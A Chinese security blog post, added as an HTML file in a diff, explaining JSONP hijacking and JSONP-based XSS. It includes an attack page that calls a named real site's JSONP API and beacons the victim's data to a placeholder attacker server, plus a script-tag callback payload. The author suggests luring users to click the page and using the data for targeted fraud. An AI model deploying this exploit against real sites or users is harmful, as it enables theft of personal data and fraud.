@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>Jsonp hijacking and xss | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2020-12-02T01:32:12.000Z" itemprop="datePublished">
+          2020-12-02
+      </time>
+    
+</span>
+                <h1>Jsonp hijacking and xss</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="FOREWORD"><a href="#FOREWORD" class="headerlink" title="FOREWORD"></a><strong>FOREWORD</strong></h2><p>jsonp劫持是发生在web前端接口的一个漏洞，其利用情况可以归属于csrf。但是两个还有区别，csrf是利用用户的cookie去发送请求，从而使用户自己执行恶意的请求，然而jsonp劫持，则是利用用户去访问接口，从而返回用户的敏感信息，然后利用攻击者构造的相应页面去将最后的结果外带到攻击者的服务器，从而窃取用户的数据；</p>
+<p>针对于jsonp劫持的文章，网上讲的都很笼统，不太好理解，这里我尽量的讲明白，其实不难；看网上的长篇大论的文章讲的有的和漏洞的利用和挖掘都没有什么关系，这里我用最少的语言表达清楚漏洞的利用和挖掘；</p>
+<h2 id="Text"><a href="#Text" class="headerlink" title="Text"></a><strong>Text</strong></h2><p>Jsonp是为了跨域获取资源从而产生的一种非官方的手段；它利用的使script标签中的src属性不受同源策略影响的特性；</p>
+<p>直入正题；jsonp劫持原理：</p>
+<p>首先可以理解用户user在网站B注册并且登陆；此时攻击者设计了一个页面A；页面A中有攻击者恶意构造的js代码；当user在B网站注侧登陆之后，再去用一个新得tap页去访问A，就会携带用户user的cookie去访问；服务器此时会返回相应的攻击者构造的页面给user；user客户端进行渲染，然而攻击者构造的页面中有代码去请求我们网站A的jsonp接口，这样就会在A上得到user的json的敏感信息，可能包括username或者id还有手机号或者email等等；然后网页A中有段恶意代码将我们用户user的json敏感信息外带到我们攻击者的服务器上，这样就可以在我们攻击者的服务器上接收到我们用户的敏感信息；这些信息对于以后的精准诈骗有很大的利用价值，掌握的信息越多，就越可以让受害者信服；</p>
+<p>基本流程如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/D5CyvT"><img src="https://s3.ax1x.com/2020/12/02/D5CyvT.png" alt="D5CyvT.png"></a></p>
+<h2 id="How-to-mine-jsonp-hijacking"><a href="#How-to-mine-jsonp-hijacking" class="headerlink" title="How to mine jsonp hijacking"></a><strong>How to mine jsonp hijacking</strong></h2><p>打开浏览器，访问个有登录的页面，登陆之后F12打开开发者模式，然后 进入network；F5刷新后，进行Ctrl+F进行搜素，一般的敏感字符都是callback，function等等；找到之后我们get访问，看看有没有敏感信息泄露；一般的jsonp接口会有回调函数，一般情况来说，回调是回调网站本身设计的某个函数去进行身份验证或者其他的操作，那么我们这里可以直接反其道行之，设计一个函数，让callback来回调我们自己的恶意方法从而实现结果外带；</p>
+<p>这里随便拿个xxx网的接口来说下：我们将callback赋值为1；发现回显可以利用；</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/D5CDCq"><img src="https://s3.ax1x.com/2020/12/02/D5CDCq.png" alt="D5CDCq.png"></a></p>
+<p>这里发现敏感API；有callback回调，也可以利用，我们构造页面如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">Hacked By s1mple</span><br><span class="line">&lt;script&gt;alert(<span class="string">&quot;你被黑了&quot;</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://you_vps:ports/?c=&quot;</span>+<span class="built_in">JSON</span>.stringify(json)</span><br><span class="line">alert(<span class="built_in">JSON</span>.stringify(json))</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;http://message.dangdang.com/api/&#123;xxxxxx&#125;?callback=test&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们本地访问测试下，发现可以攻击成功，那么我们利用的时候只需要在平台上发出我们的链接，静候他们点击就可；或者结合xss进行恶意利用；在用户访问正常页面的时候让其自动跳转到该攻击页面；然后点击的用户的敏感信息就会发到攻击者的vps上；效果如下：一些敏感信息打码；</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/D5CUbQ"><img src="https://s3.ax1x.com/2020/12/02/D5CUbQ.png" alt="D5CUbQ.png"></a></p>
+<h2 id="Jsonp-XSS"><a href="#Jsonp-XSS" class="headerlink" title="Jsonp XSS"></a><strong>Jsonp XSS</strong></h2><p>小提一下，后续会补充</p>
+<p>在上文说了jsonp劫持之后，理解jsonp xss也就不太难；也是因为callback回调函数的问题；记得上文所说的我们可以自定义callback方法，然后我们最后定义了一个恶意的方法，并将其插入在script标签里，然后随着用户访问从而被恶意加载然后将用户的信息打到我们的vps上；我们可以回顾下jsonp劫持的脚本，是先接收我们的接口信息；然后再将固定的某些信息发送到我们的服务器上；我们发现其原理也就是套用了我们的恶意函数，那么我们可以有多种触发xss的方法；</p>
+<p>首先来说因为其在script标签里执行，我们可以直接alert进行测试；不用构造恶意的页面直接<code>?callback=&lt;script&gt;alert(1)&lt;/script&gt;</code>自己在payload中加入script标签然后直接渲染，这种方法很常规；</p>
+<p>另外一种方法就是构造恶意的页面，这样的好处就是不用光明正大的亮出我们的payload；也防止被管理员清楚或者被用户怀疑；既然可构造页面，我们可以构造恶意的函数，然后用callback等之类的回调函数去触发；函数我们可以自由发挥啦；</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2020/12/09/Analysis-of-utilization-chain-of-thinkphpV6-deserialization-pop/" style="float: left;">
+        ← Analysis-of-utilization-chain-of-thinkphpV6-deserialization-pop
+    </a>
+    
+    
+    <a class="pull-right" href="/2020/11/24/WordPress-5-2-3-unauthorized-page-viewing-vulnerability/">
+        WordPress 5.2.3 unauthorized page viewing vulnerability →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
